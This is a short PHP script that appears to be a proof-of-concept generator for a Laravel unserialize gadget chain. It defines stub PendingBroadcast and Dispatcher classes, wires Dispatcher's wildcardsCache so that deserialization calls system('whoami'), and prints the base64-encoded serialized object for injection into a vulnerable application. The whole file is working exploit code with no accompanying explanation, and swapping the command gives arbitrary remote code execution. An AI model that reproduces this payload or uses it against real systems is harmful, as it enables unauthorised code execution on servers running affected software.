<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        function __construct($events, $parameter)
        {
            $this->events = $events;
            $this->event = $parameter;
        }
    }
}


namespace Illuminate\Events
{
    class Dispatcher
    {
        protected $wildcardsCache = [];

        function __construct($function, $parameter)
        {
            $this->wildcardsCache = [
                $parameter => [$function]
            ];
        }
    }
}

namespace {
    $dispatcher = new Illuminate\Events\Dispatcher("system", "whoami");
    $pendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher, "whoami");
    print_r(base64_encode(serialize($pendingBroadcast)));
}